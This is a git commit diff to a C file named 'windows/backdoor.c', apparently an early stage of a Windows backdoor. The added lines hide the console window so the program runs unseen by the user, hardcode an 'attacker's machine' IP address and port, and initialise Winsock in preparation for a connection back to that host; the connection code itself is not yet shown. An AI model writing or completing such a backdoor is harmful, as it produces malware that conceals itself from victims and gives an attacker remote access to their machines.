0d4a413d7953d1bbf0fb41870e30d43d02811560
Jatin Sharma <65252998+rootjatin@users.noreply.github.com>
2022-03-31 23:22:19 +0530

    Update backdoor.c

--- windows/backdoor.c
+++ windows/backdoor.c
@@ -14,9 +14,22 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCndLine, int n
         stealth =FindWindowA("ConsoleWindowClass",NULL);
         // HERE 0 represent that windows will not be visible to the end user and this program will going to run in background 
         ShowWindow(stealth, 0);
-
+        // these variable are required for storing the information about IP address and port 
+        struct sockaddr_in ServAddr; 
+        unsigned short ServPort; 
+        char *ServIP;
+        // stores data for windows socket  
+        WSADATA wsaData;
+        // server IP address for the connection of attacker's machine 
+        ServIP = "192.168.1.56";
+        ServPort = 50005; 
+        
+        if (WSAStartup(MAKEWORD(2,0),&wsaData) !=0){
+        
+        exit(1);        
+        }
 }
 
 int main (){
-
+        
 }
